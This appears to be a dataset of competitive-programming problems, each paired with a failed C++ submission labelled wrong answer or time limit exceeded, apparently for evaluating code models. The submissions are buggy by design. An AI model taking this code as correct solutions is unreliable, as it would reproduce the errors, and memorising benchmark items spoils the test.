{"difficulty":1300,"lang":"GNU C++17","lang_cluster":"c++","src_uid":"062a171cc3ea717ea95ede9d7a1c3a43","submission_id":"219371346","tags":["brute+force","dp"],"exec_outcome":"TIME_LIMIT_EXCEEDED","source_code":"#include <iostream>\n#include <vector>\n#include <map>\n#include <set>\n#include <math.h>\n#include <string>\n#include <algorithm>\n#include <random>\n#include <iomanip>\n#include <utility>\n#include <cstring>\n\n#define ll long long\n\nusing namespace std;\n\npair<bool,ll> co(ll n,ll aa,ll bb)\n{\n\tll i=0,a=max(aa,bb),b=min(aa,bb);\n\twhile(a*i<=n)\n\t{\n\t\tif((n-a*i)%b)i++;\n\t\telse return {true,i+(n-a*i)\/b};\n\t}\n\treturn {false,-1};\n}\n\nint main(int argc, char *argv[])\n{\n\t\n\tios::sync_with_stdio(0);\n\tcin.tie(0);\n\tcout.tie(0);\n\t\n\tll n,i,a[3],x;\n\tpair<bool,ll>p;\n\tcin>>n>>a[0]>>a[1]>>a[2];\n\tsort(a,a+3);\n\ti=n\/a[0]*a[0];\n\twhile(true)\n\t{\n\t\tp=co(n-a[0]*i,a[1],a[2]);\n\t\tif(p.first)\n\t\t{\n\t\t\tcout<<i+p.second;\n\t\t\treturn 0;\n\t\t}\n\t}\n}\n","description":"Polycarpus has a ribbon, its length is n. He wants to cut the ribbon in a way that fulfils the following two conditions:   After the cutting each ribbon piece should have length a, b or c.  After the cutting the number of ribbon pieces should be maximum. Help Polycarpus and find the number of ribbon pieces after the required cutting.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains four space-separated integers n, a, b and c (1\u2009\u2264\u2009n,\u2009a,\u2009b,\u2009c\u2009\u2264\u20094000) \u2014 the length of the original ribbon and the acceptable lengths of the ribbon pieces after the cutting, correspondingly. The numbers a, b and c can coincide.","output_spec":"Print a single number \u2014 the maximum possible number of ribbon pieces. It is guaranteed that at least one correct ribbon cutting exists.","notes":"NoteIn the first example Polycarpus can cut the ribbon in such way: the first piece has length 2, the second piece has length 3.In the second example Polycarpus can cut the ribbon in such way: the first piece has length 5, the second piece has length 2.","sample_inputs":["5 5 3 2","7 5 5 2"],"sample_outputs":["2","2"]}
{"difficulty":1500,"lang":"GNU C++0x","lang_cluster":"c++","src_uid":"0df064fd0288c2ac4832efa227107a0e","submission_id":"re_316","tags":["implementation","hashing","strings"],"exec_outcome":"WRONG_ANSWER","source_code":"\/\/ (|-__-|) \\\\\n\n#include<bits\/stdc++.h>\n\nusing namespace std;\n\ntypedef long long int ll;\n#define X first\n#define Y second\n#define mp make_pair\n\nconst int maxn = 1000 * 1000 + 10;\nconst ll  base = 701;\nll h[maxn], b[maxn], Thash;\nstring s, t;\n\nll qhash(int l, int r)\n{\n    return (h[r] - (h[l] * b[r - l]));\n}\n\nvoid input()\n{\n    cin>>s>>t;\n    b[0] = 1;\n    for(int i = 1; i < maxn; i++)\n        b[i] = b[i-1] * base;\n    for(int i = 1; i <= s.length(); i++)\n        h[i] = h[i-1] * base + s[i-1];\n    for(int i = 1; i <= t.length(); i++)\n        Thash = Thash * base + t[i-1];\n}\n\nint main()\n{\n    input();\n    vector <int> ans;\n    for(int i = 0; i < s.length(); i++)\n    {\n        ll res = qhash(0, i) * b[s.length() - i - 1] + qhash(i+1, s.length());\n        if(res == Thash)\n            ans.push_back(i+1);\n    }\n    cout<<ans.size()<<\"\\n\";\n    for(int i = 0; i < ans.size(); i++)\n        cout<<ans[i]<<endl;\n\n\n\n    return 0;\n}\n","description":"Petya has noticed that when he types using a keyboard, he often presses extra buttons and adds extra letters to the words. Of course, the spell-checking system underlines the words for him and he has to click every word and choose the right variant. Petya got fed up with correcting his mistakes himself, that\u2019s why he decided to invent the function that will correct the words itself. Petya started from analyzing the case that happens to him most of the time, when all one needs is to delete one letter for the word to match a word from the dictionary. Thus, Petya faces one mini-task: he has a printed word and a word from the dictionary, and he should delete one letter from the first word to get the second one. And now the very non-trivial question that Petya faces is: which letter should he delete?","input_from":"standard input","output_to":"standard output","input_spec":"The input data contains two strings, consisting of lower-case Latin letters. The length of each string is from 1 to 106 symbols inclusive, the first string contains exactly 1 symbol more than the second one.","output_spec":"In the first line output the number of positions of the symbols in the first string, after the deleting of which the first string becomes identical to the second one. In the second line output space-separated positions of these symbols in increasing order. The positions are numbered starting from 1. If it is impossible to make the first string identical to the second string by deleting one symbol, output one number 0.","notes":null,"sample_inputs":["abdrakadabra\nabrakadabra","aa\na","competition\ncodeforces"],"sample_outputs":["1\n3","2\n1 2","0"]}
{"difficulty":900,"lang":"GNU C++","lang_cluster":"c++","src_uid":"102667eaa3aee012fef70f4192464674","submission_id":"re_35","tags":["implementation","brute force"],"exec_outcome":"WRONG_ANSWER","source_code":"#include<algorithm>\n#include <iostream>\nusing namespace std;\n\nint main() {\n    \n    int n,m , a[51] ,b[51];\n    cin>>n;\n    for(int i=0 ;i<n ;i++){\n        cin>>a[i];\n    }\n    \n    cin>>m;\n    for(int i=0 ;i<m ;i++){\n        cin>>b[i];\n    }\n    \n    int num[100]={0};\n    int l=0;\n    for(int i=0 ;i<m ;i++){\n        for(int j=0 ;j<n ;j++){\n            if(b[i]%a[j]==0){\n            num[l]=b[i]\/a[j];\n            l++;\n            }\n        }\n        \n    }\n    sort(num,num+m);\n    int c=0;\n    for(int i=0 ;i<m ;i++){\n    \/\/  cout<<num[i];\n        if(num[i]==num[m-1])\n        c++;\n        \n    }\n    \n    cout<<c;\n    return 0;\n}","description":"Vasya's bicycle chain drive consists of two parts: n stars are attached to the pedal axle, m stars are attached to the rear wheel axle. The chain helps to rotate the rear wheel by transmitting the pedal rotation.We know that the i-th star on the pedal axle has ai (0\u2009&lt;\u2009a1\u2009&lt;\u2009a2\u2009&lt;\u2009...\u2009&lt;\u2009an) teeth, and the j-th star on the rear wheel axle has bj (0\u2009&lt;\u2009b1\u2009&lt;\u2009b2\u2009&lt;\u2009...\u2009&lt;\u2009bm) teeth. Any pair (i,\u2009j) (1\u2009\u2264\u2009i\u2009\u2264\u2009n;\u00a01\u2009\u2264\u2009j\u2009\u2264\u2009m) is called a gear and sets the indexes of stars to which the chain is currently attached. Gear (i,\u2009j) has a gear ratio, equal to the value .Since Vasya likes integers, he wants to find such gears (i,\u2009j), that their ratios are integers. On the other hand, Vasya likes fast driving, so among all \"integer\" gears (i,\u2009j) he wants to choose a gear with the maximum ratio. Help him to find the number of such gears.In the problem, fraction  denotes division in real numbers, that is, no rounding is performed.","input_from":"standard input","output_to":"standard output","input_spec":"The first input line contains integer n (1\u2009\u2264\u2009n\u2009\u2264\u200950) \u2014 the number of stars on the bicycle's pedal axle. The second line contains n integers a1,\u2009a2,\u2009...,\u2009an (1\u2009\u2264\u2009ai\u2009\u2264\u2009104) in the order of strict increasing. The third input line contains integer m (1\u2009\u2264\u2009m\u2009\u2264\u200950) \u2014 the number of stars on the rear wheel axle. The fourth line contains m integers b1,\u2009b2,\u2009...,\u2009bm (1\u2009\u2264\u2009bi\u2009\u2264\u2009104) in the order of strict increasing. It is guaranteed that there exists at least one gear (i,\u2009j), that its gear ratio is an integer. The numbers on the lines are separated by spaces.","output_spec":"Print the number of \"integer\" gears with the maximum ratio among all \"integer\" gears.","notes":"NoteIn the first sample the maximum \"integer\" gear ratio equals 3. There are two gears that have such gear ratio. For one of them a1\u2009=\u20094,\u2009b1\u2009=\u200912, and for the other a2\u2009=\u20095,\u2009b3\u2009=\u200915.","sample_inputs":["2\n4 5\n3\n12 13 15","4\n1 2 3 4\n5\n10 11 12 13 14"],"sample_outputs":["2","1"]}
{"difficulty":1400,"lang":"GNU C++","lang_cluster":"c++","src_uid":"138fd96bf5a677a6d59c20f88fd612f1","submission_id":"re_25","tags":["greedy"],"exec_outcome":"WRONG_ANSWER","source_code":"#include <vector>\n#include <list>\n#include <set>\n#include <map>\n#include <stack>\n#include <deque>\n#include <queue>\n#include <bitset>\n#include <functional>\n#include <numeric>\n#include <utility>\n#include <complex>\n#include <string>\n#include <iomanip>\n#include <sstream>\n#include <fstream>\n#include <iostream>\n#include <algorithm>\n#include <cstdio>\n#include <cmath>\n#include <ctime>\n#include <cctype>\n#include <cstdlib>\n#include <cstring>\n#include <cassert>\nusing namespace std;\n\n\/\/BEGIN TEMPLATE HERE\n#define SIZE(X) ((int)(X.size()))\n#define LENGTH(X) ((int)(X.length()))\n\/\/END TEMPLATE HERE\n\nlong long x, y;\nint N;\n\nlong long sqr(long long x) {\n    return x * x;\n}\n\nint main() {\n    scanf(\"%d%I64d%I64d\", &N, &x, &y);\n    int i;\n    for (i = 0; i < N && i <= y; ++i) {\n        if ((y - i) \/ (N - i) > 0 && i + sqr((y - i) \/ (N - i)) * (N - i - (y - i) % (N - i)) + sqr((y - i) \/ (N - i) + 1) * ((y - i) % (N - i)) >= x) {\n            break;\n        }\n    }\n    if (i < N) {\n        for (int j = 0; j < i; ++j) printf(\"1\\n\");\n        for (int j = 0; j < (N - i - (y - i) % (N - i)); ++j) printf(\"%I64d\\n\", (y - i) \/ (N - i));\n        for (int j = 0; j < (y - i) % (N - i); ++j) printf(\"%I64d\\n\", (y - i) \/ (N - i) + 1);\n    } else {\n        printf(\"-1\\n\");\n    }\n    return 0;\n}\n\n","description":"Little Petya loves inequations. Help him find n positive integers a1,\u2009a2,\u2009...,\u2009an, such that the following two conditions are satisfied: a12\u2009+\u2009a22\u2009+\u2009...\u2009+\u2009an2\u2009\u2265\u2009x a1\u2009+\u2009a2\u2009+\u2009...\u2009+\u2009an\u2009\u2264\u2009y","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains three space-separated integers n, x and y (1\u2009\u2264\u2009n\u2009\u2264\u2009105,\u20091\u2009\u2264\u2009x\u2009\u2264\u20091012,\u20091\u2009\u2264\u2009y\u2009\u2264\u2009106). Please do not use the %lld specificator to read or write 64-bit integers in \u0421++. It is recommended to use cin, cout streams or the %I64d specificator.","output_spec":"Print n positive integers that satisfy the conditions, one integer per line. If such numbers do not exist, print a single number \"-1\". If there are several solutions, print any of them.","notes":null,"sample_inputs":["5 15 15","2 3 2","1 99 11"],"sample_outputs":["4\n4\n1\n1\n2","-1","11"]}
{"difficulty":1200,"lang":"GNU C++14","lang_cluster":"c++","src_uid":"15fa49860e978d3b3fb7a20bf9f8aa86","submission_id":"re_611","tags":["implementation","geometry","brute force"],"exec_outcome":"WRONG_ANSWER","source_code":"#include<iostream>\n#include<cmath>\nusing namespace std;\n\ndouble Dis(double x1, int y1, double x2, double y2)\n{\n\treturn sqrt((x1 - x2)*(x1 - x2) + (y1 - y2)*(y1 - y2));\n}\n\nint main()\n{\n\tint n, vb, vs;\n\tcin >> n >> vb >> vs;\n\tint *stop = new int[n + 1];\n\tfor (int i = 1; i <= n; ++i)\n\t\tcin >> stop[i];\n\tint xu, yu;\n\tcin >> xu >> yu;\n\n\tint get_off{ 2 };\n\tif (vs >= vb)\n\t{\n\t\tif (vs == vb && yu == 0 && xu > stop[2])\n\t\t{\n\t\t\tdo { ++get_off; } while (stop[get_off] <= xu && get_off <= n);\n\t\t\t--get_off;\n\t\t}\n\t\t\n\t}\n\telse\n\t{\n\t\tint cnt = 1;\n\t\tdouble min_time = 2000000000, min_su;\n\t\twhile (stop[cnt] < xu && cnt < n)\n\t\t{\n\t\t\t++cnt;\n\t\t\tdouble stu_univ = Dis(stop[cnt], 0, xu, yu);\n\t\t\tdouble time = stop[cnt] \/ vb + stu_univ \/ vs;\n\t\t\tif (time < min_time)\n\t\t\t{\n\t\t\t\tget_off = cnt;\n\t\t\t\tmin_time = time;\n\t\t\t\tmin_su = stu_univ;\n\t\t\t}\n\t\t\telse if (time == min_time && stu_univ < min_su)\n\t\t\t{\n\t\t\t\tget_off = cnt;\n\t\t\t\tmin_su = stu_univ;\n\t\t\t}\n\t\t}\n\t}\n\tcout << get_off << endl;\n\treturn 0;\n}","description":"And again a misfortune fell on Poor Student. He is being late for an exam.Having rushed to a bus stop that is in point (0,\u20090), he got on a minibus and they drove along a straight line, parallel to axis OX, in the direction of increasing x.Poor Student knows the following:   during one run the minibus makes n stops, the i-th stop is in point (xi,\u20090)  coordinates of all the stops are different  the minibus drives at a constant speed, equal to vb  it can be assumed the passengers get on and off the minibus at a bus stop momentarily  Student can get off the minibus only at a bus stop  Student will have to get off the minibus at a terminal stop, if he does not get off earlier  the University, where the exam will be held, is in point (xu,\u2009yu)  Student can run from a bus stop to the University at a constant speed vs as long as needed  a distance between two points can be calculated according to the following formula:   Student is already on the minibus, so, he cannot get off at the first bus stop Poor Student wants to get to the University as soon as possible. Help him to choose the bus stop, where he should get off. If such bus stops are multiple, choose the bus stop closest to the University.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains three integer numbers: 2\u2009\u2264\u2009n\u2009\u2264\u2009100, 1\u2009\u2264\u2009vb,\u2009vs\u2009\u2264\u20091000. The second line contains n non-negative integers in ascending order: coordinates xi of the bus stop with index i. It is guaranteed that x1 equals to zero, and xn\u2009\u2264\u2009105. The third line contains the coordinates of the University, integers xu and yu, not exceeding 105 in absolute value. ","output_spec":"In the only line output the answer to the problem \u2014 index of the optimum bus stop.","notes":"NoteAs you know, students are a special sort of people, and minibuses usually do not hurry. That's why you should not be surprised, if Student's speed is higher than the speed of the minibus.","sample_inputs":["4 5 2\n0 2 4 6\n4 1","2 1 1\n0 100000\n100000 100000"],"sample_outputs":["3","2"]}
{"difficulty":1500,"lang":"GNU C++14","lang_cluster":"c++","src_uid":"1a740b0ad2ec3ed208f01fc7b64e00d4","submission_id":"re_88","tags":["dfs and similar","brute force","shortest paths"],"exec_outcome":"WRONG_ANSWER","source_code":"#include<iostream>\n#include<fstream>\n#define f first\n#define s second\nusing namespace std;\nint mark[2000+10][2000+10];\npair<int,int>a[100000+10];\nint n,m,k;\nint size;\nifstream fin(\"input.txt\");\nofstream fout(\"output.txt\");\nint main()\n{\n\tfin>>n>>m>>k;\n\tfor(int i=1;i<=k;i++)\n\t{\n\t\tint v,c;\n\t\tfin>>v>>c;\n\t\/\/\tmark[v][c]=1;\n\t\ta[size]=make_pair(v,c);\n\t\tsize++;\n\t}\n\tfor(int i=0;i<size;i++)\n\t{\n\t\tint q=a[i].f;\/\/i\n\t\tint w=a[i].s;\/\/\n\t\t\/\/fout<<q<<\" \"<<w<<\" \"<<mark[q][w]<<endl;\n\t\tmark[q][w]=1;\n\n\t\tif(q>1&&mark[q-1][w]==0)\n\t\t{\n\t\t\t\/\/fout<<q-1<<\" \"<<w<<\" \"<<mark[q-1][w]<<endl;\t\t\t\n\t\t\ta[size]=make_pair((q-1),w);\n\t\t\tmark[q-1][w]=1;\n\t\t\tsize++;\n\t\t}\n\t\tif(w>1&&mark[q][w-1]==0)\n\t\t{\n\t\t\tfout<<q<<\" \"<<w-1<<\" \"<<mark[q][w-1]<<endl;\t\t\t\n\t\t\ta[size]=make_pair(q,(w-1));\n\t\t\tmark[q][w-1]=1;\n\t\t\tsize++;\n\t\t}\n\t\tif(q<n&&mark[q+1][w]==0)\n\t\t{\n\n\t\t\t\/\/fout<<q+1<<\" \"<<w<<\" \"<<mark[q+1][w]<<endl;\t\n\t\t\ta[size]=make_pair((q+1),w);\n\t\t\tmark[q+1][w]=1;\n\t\t\tsize++;\n\t\t}\n\t\tif(w<m&&mark[q][w+1]==0)\n\t\t{\n\t\t\t\/\/fout<<\"dddd\";\n\t\t\n\t\t\t\/\/fout<<q<<\" \"<<w+1<<\" \"<<mark[q][w+1]<<endl;\t\t\n\t\t\ta[size]=make_pair(q,(w+1));\n\t\t\tmark[q][w+1]=1;\n\t\t\tsize++;\n\t\t}\n\n\t}\n\t\/\/fout<<\" -==============- \"<<endl;\n\t\t\tfout<<a[size-1].f<<\" \"<<a[size-1].s<<endl;\n\t\n}\n\t","description":"After a terrifying forest fire in Berland a forest rebirth program was carried out. Due to it N rows with M trees each were planted and the rows were so neat that one could map it on a system of coordinates so that the j-th tree in the i-th row would have the coordinates of (i,\u2009j). However a terrible thing happened and the young forest caught fire. Now we must find the coordinates of the tree that will catch fire last to plan evacuation.The burning began in K points simultaneously, which means that initially K trees started to burn. Every minute the fire gets from the burning trees to the ones that aren\u2019t burning and that the distance from them to the nearest burning tree equals to 1.Find the tree that will be the last to start burning. If there are several such trees, output any.","input_from":"input.txt","output_to":"output.txt","input_spec":"The first input line contains two integers N,\u2009M (1\u2009\u2264\u2009N,\u2009M\u2009\u2264\u20092000) \u2014 the size of the forest. The trees were planted in all points of the (x,\u2009y) (1\u2009\u2264\u2009x\u2009\u2264\u2009N,\u20091\u2009\u2264\u2009y\u2009\u2264\u2009M) type, x and y are integers. The second line contains an integer K (1\u2009\u2264\u2009K\u2009\u2264\u200910) \u2014 amount of trees, burning in the beginning.  The third line contains K pairs of integers: x1,\u2009y1,\u2009x2,\u2009y2,\u2009...,\u2009xk,\u2009yk (1\u2009\u2264\u2009xi\u2009\u2264\u2009N,\u20091\u2009\u2264\u2009yi\u2009\u2264\u2009M) \u2014 coordinates of the points from which the fire started. It is guaranteed that no two points coincide.","output_spec":"Output a line with two space-separated integers x and y \u2014 coordinates of the tree that will be the last one to start burning. If there are several such trees, output any.","notes":null,"sample_inputs":["3 3\n1\n2 2","3 3\n1\n1 1","3 3\n2\n1 1 3 3"],"sample_outputs":["1 1","3 3","2 2"]}
{"difficulty":800,"lang":"GNU C++17","lang_cluster":"c++","src_uid":"230a3c4d7090401e5fa3c6b9d994cdf2","submission_id":"218472447","tags":["brute+force","math"],"exec_outcome":"WRONG_ANSWER","source_code":"#include <iostream>\r\n\r\nusing namespace std;\r\n\r\nint main()\r\n{\r\n    int w;\r\n    cout<<\"enter the wight\";\r\n    cin>>w;\r\n    if (w==1||w==2||w%2==1)\r\n        cout<<\"no\";\r\n    else\r\n        cout<<\"yes\";\r\n\r\n    return 0;\r\n}\r\n","description":"One hot summer day Pete and his friend Billy decided to buy a watermelon. They chose the biggest and the ripest one, in their opinion. After that the watermelon was weighed, and the scales showed w kilos. They rushed home, dying of thirst, and decided to divide the berry, however they faced a hard problem.Pete and Billy are great fans of even numbers, that's why they want to divide the watermelon in such a way that each of the two parts weighs even number of kilos, at the same time it is not obligatory that the parts are equal. The boys are extremely tired and want to start their meal as soon as possible, that's why you should help them and find out, if they can divide the watermelon in the way they want. For sure, each of them should get a part of positive weight.","input_from":"standard input","output_to":"standard output","input_spec":"The first (and the only) input line contains integer number w (1\u2009\u2264\u2009w\u2009\u2264\u2009100) \u2014 the weight of the watermelon bought by the boys.","output_spec":"Print YES, if the boys can divide the watermelon into two parts, each of them weighing even number of kilos; and NO in the opposite case.","notes":"NoteFor example, the boys can divide the watermelon into two parts of 2 and 6 kilos respectively (another variant \u2014 two parts of 4 and 4 kilos).","sample_inputs":["8"],"sample_outputs":["YES"]}
{"difficulty":800,"lang":"GNU C++17","lang_cluster":"c++","src_uid":"3714b7596a6b48ca5b7a346f60d90549","submission_id":"218843897","tags":["implementation"],"exec_outcome":"WRONG_ANSWER","source_code":"#include <iostream>\r\nusing namespace std;\r\n\r\nint main()\r\n{\r\n    int n;\r\n    cin >> n;\r\n    int a[n];\r\n    int b[n];\r\n    int t[n];\r\n    int j = 0;\r\n    for (int i = 0; i < n; i++)\r\n    {\r\n        cin >> a[i];\r\n    }\r\n    for (int i = 0; i < n; i++)\r\n    {\r\n        cin >> b[i];\r\n    }\r\n    for (int i = 0; i < n; i++)\r\n    {\r\n        if (a[i] == b[i])\r\n        {\r\n            t[j] = 0;\r\n            j++;\r\n        }\r\n        else\r\n        {\r\n            t[j] = 1;\r\n            j++;\r\n        }\r\n    }\r\n    for (j = 0; j < n; j++)\r\n    {\r\n        cout << t[j];\r\n    }\r\n    return 0;\r\n}","description":"Shapur was an extremely gifted student. He was great at everything including Combinatorics, Algebra, Number Theory, Geometry, Calculus, etc. He was not only smart but extraordinarily fast! He could manage to sum 1018 numbers in a single second.One day in 230 AD Shapur was trying to find out if any one can possibly do calculations faster than him. As a result he made a very great contest and asked every one to come and take part.In his contest he gave the contestants many different pairs of numbers. Each number is made from digits 0 or 1. The contestants should write a new number corresponding to the given pair of numbers. The rule is simple: The i-th digit of the answer is 1 if and only if the i-th digit of the two given numbers differ. In the other case the i-th digit of the answer is 0.Shapur made many numbers and first tried his own speed. He saw that he can perform these operations on numbers of length \u221e (length of a number is number of digits in it) in a glance! He always gives correct answers so he expects the contestants to give correct answers, too. He is a good fellow so he won't give anyone very big numbers and he always gives one person numbers of same length.Now you are going to take part in Shapur's contest. See if you are faster and more accurate.","input_from":"standard input","output_to":"standard output","input_spec":"There are two lines in each input. Each of them contains a single number. It is guaranteed that the numbers are made from 0 and 1 only and that their length is same. The numbers may start with 0. The length of each number doesn't exceed 100.","output_spec":"Write one line \u2014 the corresponding answer. Do not omit the leading 0s.","notes":null,"sample_inputs":["1010100\n0100101","000\n111","1110\n1010","01110\n01100"],"sample_outputs":["1110001","111","0100","00010"]}
{"difficulty":800,"lang":"GNU C++17","lang_cluster":"c++","src_uid":"38c4864937e57b35d3cce272f655e20f","submission_id":"218195287","tags":["implementation"],"exec_outcome":"WRONG_ANSWER","source_code":"#include<iostream>\r\n#include <bits\/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\n     int n =4;\r\nlong long int s[15];\r\n\r\n int count =0;\r\n for(int i=1;i<4;i++){\r\n    cin >> s[i];\r\n    sort(s,s+n);\r\n    if(s[i]!=s[i-1]){\r\n        count++;\r\n    }\r\n }\r\n \r\n cout << n-count;\r\n \r\n return 0;\r\n    \r\n}","description":"Valera the Horse is going to the party with friends. He has been following the fashion trends for a while, and he knows that it is very popular to wear all horseshoes of different color. Valera has got four horseshoes left from the last year, but maybe some of them have the same color. In this case he needs to go to the store and buy some few more horseshoes, not to lose face in front of his stylish comrades.Fortunately, the store sells horseshoes of all colors under the sun and Valera has enough money to buy any four of them. However, in order to save the money, he would like to spend as little money as possible, so you need to help Valera and determine what is the minimum number of horseshoes he needs to buy to wear four horseshoes of different colors to a party.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains four space-separated integers s1,\u2009s2,\u2009s3,\u2009s4 (1\u2009\u2264\u2009s1,\u2009s2,\u2009s3,\u2009s4\u2009\u2264\u2009109) \u2014 the colors of horseshoes Valera has. Consider all possible colors indexed with integers.","output_spec":"Print a single integer \u2014 the minimum number of horseshoes Valera needs to buy.","notes":null,"sample_inputs":["1 7 3 3","7 7 7 7"],"sample_outputs":["1","3"]}
{"difficulty":1500,"lang":"GNU C++17","lang_cluster":"c++","src_uid":"41dfc86d341082dd96e089ac5433dc04","submission_id":"219014830","tags":["binary+search","implementation"],"exec_outcome":"WRONG_ANSWER","source_code":"#include <algorithm>\r\n#include <bits\/stdc++.h>\r\n#define ll long long\r\n#define dd double\r\n#define N '\\n'\r\n#define ld long double\r\n#define sz(x) (int)((x).size())\r\n#define precise(x) cout << fixed << setprecision(x)\r\n#define el endl\r\n#define cin(vec) for(auto& i : vec) cin >> i\r\n#define all(x) x.begin(),x.end()\r\n#define FASTER ios::sync_with_stdio(0);cin.tie(NULL);cout.tie(NULL);\r\nusing namespace std;\r\nll gcd(ll a, ll b)\r\n{\r\n    while (b != 0)\r\n    {\r\n        ll a2 = a;\r\n        a = b;\r\n        b = a2 % b;\r\n    }\r\n    return a;\r\n    \/\/**********************gcd************************\r\n}\r\nll lcm(ll a, ll b)\r\n{\r\n    return a \/ gcd(a, b) * b;\r\n\/\/ *********************lcm**********************\r\n\r\n}\r\n\r\nbool is_prime_num(int x )\r\n{\r\n\r\n    for(int i =2 ; i * i <= x ; i++)\r\n    {\r\n        if(x%i==0)\r\n            return false;\r\n    }\r\n    return true;\r\n}\r\n\r\nvector<ll> generate_divisors(ll n)\r\n{\r\n    vector<ll> v;\r\n    ll i = 1;\r\n\r\n    for (; i * i <= n; i++)\r\n    {\r\n        if (n % i == 0)\r\n        {\r\n            v.push_back(i);\r\n            if (i != n \/ i)\r\n            {\r\n                v.push_back(n \/ i);\r\n            }\r\n        }\r\n    }\r\n\r\n    \/\/ If i * i equals n, add the last divisor only once\r\n    if (i * i == n)\r\n    {\r\n        v.push_back(i);\r\n    }\r\n\r\n    return v;\r\n}\r\n\/*\r\nvector<int>premution;\r\nint cnt_prime=0;\r\nbool is_visited[4];\r\nint n=4\r\nvoid get_prem(int i=0)\r\n{\r\n    if(i==n)\r\n    {\r\n        cnt_prime++;\r\n        return;\r\n    }\r\n}\r\nfor(int j=0; j<n; j++)\r\n{\r\n    if(is_visited[j])\r\n    {\r\n        continue;\r\n    }\r\n    premution.push_back(j);\r\n    is_visited[j]=1;\r\n    get_prem(i+1);\r\n    is_visited[j]=0;\r\n    premution.pop_back();\r\n\r\n}\r\n*\/\r\nint main ()\r\n{\r\n    FASTER;\r\n    int n,k;\r\n    cin>>n>>k;\r\n    int low=0;\r\n    int hight=n-1;\r\n    int num=0;\r\n    int mid=(low+hight)\/2;\r\n    int mn=INT_MAX;\r\n    while(low<=hight)\r\n    {\r\n            if(mid\/k<=n)\r\n            {\r\n                num=mid;\r\n                low=mid+1;\r\n            }\r\n            else\r\n            {\r\n                hight=mid-1;\r\n            }\r\n        }\r\n\r\n    cout<<mn<<el;\r\n}\r\n\r\n\/\/0 and any thing equal zero\r\n\/\/x&1==0 constant time optimization very fast  to know is even or time\r\n\/\/ x>>n => x\/2^n\r\n\/\/x<<n =2^n\r\n\r\n\r\n\/\/ gcd factorial gcd between the min element\r\n\r\n","description":"One day a highly important task was commissioned to Vasya \u2014 writing a program in a night. The program consists of n lines of code. Vasya is already exhausted, so he works like that: first he writes v lines of code, drinks a cup of tea, then he writes as much as  lines, drinks another cup of tea, then he writes  lines and so on: , , , ...The expression  is regarded as the integral part from dividing number a by number b.The moment the current value  equals 0, Vasya immediately falls asleep and he wakes up only in the morning, when the program should already be finished.Vasya is wondering, what minimum allowable value v can take to let him write not less than n lines of code before he falls asleep.","input_from":"standard input","output_to":"standard output","input_spec":"The input consists of two integers n and k, separated by spaces \u2014 the size of the program in lines and the productivity reduction coefficient, 1\u2009\u2264\u2009n\u2009\u2264\u2009109, 2\u2009\u2264\u2009k\u2009\u2264\u200910.","output_spec":"Print the only integer \u2014 the minimum value of v that lets Vasya write the program in one night.","notes":"NoteIn the first sample the answer is v\u2009=\u20094. Vasya writes the code in the following portions: first 4 lines, then 2, then 1, and then Vasya falls asleep. Thus, he manages to write 4\u2009+\u20092\u2009+\u20091\u2009=\u20097 lines in a night and complete the task.In the second sample the answer is v\u2009=\u200954. Vasya writes the code in the following portions: 54, 6. The total sum is 54\u2009+\u20096\u2009=\u200960, that's even more than n\u2009=\u200959.","sample_inputs":["7 2","59 9"],"sample_outputs":["4","54"]}
{"difficulty":800,"lang":"GNU C++17","lang_cluster":"c++","src_uid":"46bfdec9bfc1e91bd2f5022f3d3c8ce7","submission_id":"219063100","tags":["constructive+algorithms","implementation","math"],"exec_outcome":"TIME_LIMIT_EXCEEDED","source_code":"#include <bits\/stdc++.h>\r\nusing namespace std;\r\ntypedef long long ll;\r\ntypedef vector<int> vi;\r\ntypedef pair<int , int> pi;\r\n#define pb push_back\r\n#define F first\r\n#define S second\r\n#define S second\r\n#define rep(i , a , b) for(int i = a ;i< b ; i++)\r\n\r\nint main(){\r\n    ios_base::sync_with_stdio(false);\r\n    cin.tie(NULL);\r\n    cout.tie(NULL);\r\n    int arr[5];\r\n    rep(i ,0 , 5) cin >> arr[i];\r\n    int a[arr[4]] = {0};\r\n    rep(i , 0, 4){\r\n        for(int j=arr[i] ; j < arr[4]; j+= arr[i]){\r\n            a[j]++;\r\n        }\r\n    }\r\n    int cnt = 0;\r\n    rep(i , 0, arr[4]){\r\n        if(arr[i] == 0) cnt++;\r\n    }\r\n\r\n    cout << cnt << endl;\r\n    return 0;\r\n}","description":"\u00abOne dragon. Two dragon. Three dragon\u00bb, \u2014 the princess was counting. She had trouble falling asleep, and she got bored of counting lambs when she was nine.However, just counting dragons was boring as well, so she entertained herself at best she could. Tonight she imagined that all dragons were here to steal her, and she was fighting them off. Every k-th dragon got punched in the face with a frying pan. Every l-th dragon got his tail shut into the balcony door. Every m-th dragon got his paws trampled with sharp heels. Finally, she threatened every n-th dragon to call her mom, and he withdrew in panic.How many imaginary dragons suffered moral or physical damage tonight, if the princess counted a total of d dragons?","input_from":"standard input","output_to":"standard output","input_spec":"Input data contains integer numbers k,\u2009l,\u2009m,\u2009n and d, each number in a separate line (1\u2009\u2264\u2009k,\u2009l,\u2009m,\u2009n\u2009\u2264\u200910, 1\u2009\u2264\u2009d\u2009\u2264\u2009105).","output_spec":"Output the number of damaged dragons.","notes":"NoteIn the first case every first dragon got punched with a frying pan. Some of the dragons suffered from other reasons as well, but the pan alone would be enough.In the second case dragons 1, 7, 11, 13, 17, 19 and 23 escaped unharmed.","sample_inputs":["1\n2\n3\n4\n12","2\n3\n4\n5\n24"],"sample_outputs":["12","17"]}
